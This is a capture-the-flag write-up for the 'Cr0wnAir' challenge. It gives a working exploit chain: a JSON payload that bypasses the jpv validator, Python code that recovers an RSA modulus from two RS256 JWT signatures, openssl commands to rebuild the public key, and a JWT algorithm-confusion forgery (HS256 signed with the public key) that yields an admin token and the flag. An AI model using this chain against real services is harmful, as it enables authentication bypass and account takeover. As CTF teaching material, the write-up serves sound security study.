# Cr0wnAir

## Step 1: Getting two `RS256` signatures

To get a signature we need to bypass a filter validated by `jpv` ("JSON Pattern Validator").

TL;DR - this package has a lot of [bypasses](https://github.com/manvel-khnkoyan/jpv/issues?q=is%3Aissue+bypass) and should probably not be used for security sensitive stuff.
We went with the following bypass:

```json
{
	"firstName": "John",
	"lastName": "Doe",
	"passport": "123456789",
	"ffp": "CA01234567",
	"extras": {
		"sssr": {
			"sssr": "FQTU"
		},
		"constructor": {
			"name": "Array"
		}
	}
}
```

Using this we can now get two different tokens by changing `ffp`:

```python
POST("http://34.105.202.19:3000/checkin", json={...})["token"]
# ...
```

Using this we now have `jwt0` and `jwt1`:

```
jwt0 = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1NjcwIn0.qUyBBaVNyJ65S_BryJi-nNLgZv1grL9Pivn9OYZKkxMV3fnt6iXanNb9uJIqw2UaFHhQs0vg6LIHn95c42iKcgzUjukk71DmZSwGkbEbqDMIRN8IfNGCsiHcN6OTNhpj-gpNWTsLtGVLQpuAA6WnG1pizKb_WP2oihOD6t13_rE6n5Z8DA689D4EqWJB4jiwvd4WGl8Qlc1LWv4fU76zZHI8_x98FIsih0L1AC2SoPSMccDBPAs7MuF9TCSx10LajwQxMt1_zAIfEbLocJnfKLw4kiuJS6npU7xdMvcbWgsHaN5rMb_7dxVci-uMn3IIPHiL23PK0nBpYSe6U_uBOw"
jwt1 = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1NjcxIn0.d3j6-ipgFrOQWaOAhbBUYoa2H9zstPxQsFN63kaUPNinwY2ClvssctEfG3UqQXjBMz39cFgQj_kHyu6fTHj8OtToQ8ul1iav_TewhAov1uo6Sumsi6l6-Ubwtj_oe3-FZ0taol-YYihu8rPlVNvh4oAYwoptrwS6bR5Y1atT0Cd8fGLgyFfbrfLEIN7dfd2T3CUCVemgQ1Ydpuxyp_MteXCcbDx6QimMkzNU_DGU6KEBKft-gz1kZLGWwFtc5Pm523x3kHS31W3pCxyTE6kGEjcz45tvI9pwlWEblbMQhW5zJELLm8XHVrLbMBz6R_e-m4YpaGxgu7WICZelpbikaw"
```

To find `N` we want to calc: `gcd(magic0, magic1)` with magic being: `pow(signature, e) - msg)` for each of the JWTs.
Note that even though the two 'magic' will be *huge* numbers, we can calculate the GCD of the two.

Note all numbers are wrapped in `gmpy2.mpz(...)` to speed-up things, but it isn't needed.

```python
from base64 import urlsafe_b64decode
from Crypto.Util.number import bytes_to_long, long_to_bytes
import gmpy2

def get_magic(jwt):
    header, payload, signature = jwt.split(".")

    raw_signature = urlsafe_b64decode(f"{signature}==")
    raw_signature_int = gmpy2.mpz(bytes_to_long(raw_signature))

    # In RS256 we sign the base64 encoded header and payload padded using PKCS1 v1.5:
    padded_msg = pkcs1_v1_5_encode(f"{header}.{payload}".encode(), len(raw_signature))
    padded_int = gmpy2.mpz(bytes_to_long(padded_msg))

    return gmpy2.mpz(pow(raw_signature_int, e) - padded_int)
```

Note: I had a lot of trouble finding a implementation of `pkcs1_v1_5_encode` that uses SHA256, so here you go:

```
from hashlib import sha256

def pkcs1_v1_5_encode(msg: bytes, n_len: int):
    SHA256_Digest_Info = b'\x30\x31\x30\x0D\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20'
    T = SHA256_Digest_Info + sha256(msg).digest()
    PS = b'\xFF' * (n_len - len(T) - 3)
    return b'\x00\x01' + PS + b'\x00' + T
```

This takes about xx sec:

```python
e = gmpy2.mpz(65537)

magic0 = get_magic(jwt0)
magic1 = get_magic(jwt1)
# ^ Check the number of digits: len(str(magic0)) == 40_392_410  :O

N = gmpy2.gcd(magic0, magic1)
assert N != 1
# ^ This takes a minute or two
print(hex(N))
# 0xc3995f664ac0cc18e5dae7f66c5e2ab96ccf6e613372c8d51b011e3eb8f7b5087681058cc3b1cebcd36a54c59bbb22b45585b293f109d885e4ad5f91ef2cf544e15fda0307e8c45c7556a4405d0c40955118e9b0008c62f98ed7ddfa3c1ec8c9573cc49385f2fa7593192fc5b8d496fa7d1c87cd67959ca4bab55c0ca4d2ef3c4f8ceb643acc1fca9a2a672109f14ca7df656059c67520ae020759bd65ad230cb537d288724f77b7194593faa9144a2687b4c4d58aaf02c5233395f142d404a6013d70184fbfadc52d4cfbd52a68747d33b6b2a12c090a76306cca93c2b5221c1dbee697aa03851887016daa8cc0a8e95c87d325221beebc04cbf8b737dcbc0b
```

## Generating a public key (`der`/`pem`) from `e` and `N`

Save the following as `def.asn1` (insert `N`):

```ini
# Start with a SEQUENCE
asn1=SEQUENCE:pubkeyinfo

# pubkeyinfo contains an algorithm identifier and the public key wrapped in a BIT STRING
[pubkeyinfo]
algorithm=SEQUENCE:rsa_alg
pubkey=BITWRAP,SEQUENCE:rsapubkey

# algorithm ID for RSA is just an OID and a NULL
[rsa_alg]
algorithm=OID:rsaEncryption
parameter=NULL

# Actual public key: modulus and exponent
[rsapubkey]
n=INTEGER:0xc3995f664ac0cc18e5dae7f66c5e2ab96ccf6e613372c8d51b011e3eb8f7b5087681058cc3b1cebcd36a54c59bbb22b45585b293f109d885e4ad5f91ef2cf544e15fda0307e8c45c7556a4405d0c40955118e9b0008c62f98ed7ddfa3c1ec8c9573cc49385f2fa7593192fc5b8d496fa7d1c87cd67959ca4bab55c0ca4d2ef3c4f8ceb643acc1fca9a2a672109f14ca7df656059c67520ae020759bd65ad230cb537d288724f77b7194593faa9144a2687b4c4d58aaf02c5233395f142d404a6013d70184fbfadc52d4cfbd52a68747d33b6b2a12c090a76306cca93c2b5221c1dbee697aa03851887016daa8cc0a8e95c87d325221beebc04cbf8b737dcbc0b

e=INTEGER:0x010001
```

Then run:

```sh
openssl asn1parse -genconf def.asn1 -out pubkey.der
openssl rsa -in pubkey.der -inform der -pubin -out pubkey.pem
```

And we get the public key in PEM format:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw5lfZkrAzBjl2uf2bF4q
uWzPbmEzcsjVGwEePrj3tQh2gQWMw7HOvNNqVMWbuyK0VYWyk/EJ2IXkrV+R7yz1
ROFf2gMH6MRcdVakQF0MQJVRGOmwAIxi+Y7X3fo8HsjJVzzEk4Xy+nWTGS/FuNSW
+n0ch81nlZykurVcDKTS7zxPjOtkOswfypoqZyEJ8Uyn32VgWcZ1IK4CB1m9Za0j
DLU30ohyT3e3GUWT+qkUSiaHtMTViq8CxSMzlfFC1ASmAT1wGE+/rcUtTPvVKmh0
fTO2sqEsCQp2MGzKk8K1IhwdvuaXqgOFGIcBbaqMwKjpXIfTJSIb7rwEy/i3N9y8
CwIDAQAB
-----END PUBLIC KEY-----
```

## Signing a arbitrary JWT using a public key

Note: For this you need the `PyJWT` package in pip.
There are two packages which allows `import jwt`.

```bash
JWT_HEADER="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"  # b64({"typ":"JWT","alg":"HS256"})
PAYLOAD=$(echo -n '{"admin":true}' | base64 | tr -d "=")  # Any JWT payload
# Generate the signature:
echo -n "$JWT_HEADER.$PAYLOAD" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat pubkey.pem | xxd -p | tr -d '\n')
(stdin)= 63af5ca2408da191d7f75bbcc1c441ec23a4b291a61d2f6478777967b9682132

SIG=$(python3 -c 'from base64 import *; print(urlsafe_b64encode(bytes.fromhex("63af5c...2132")).decode().rstrip("="))')

echo "Forged JWT: $JWT_HEADER.$PAYLOAD.$SIG"
```

Forged JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.Y69cokCNoZHX91u8wcRB7COkspGmHS9keHd5Z7loITI

Post it to the flag endpoint and get: `union{I_<3_JS0N_4nD_th1ngs_wr4pp3d_in_JS0N}`
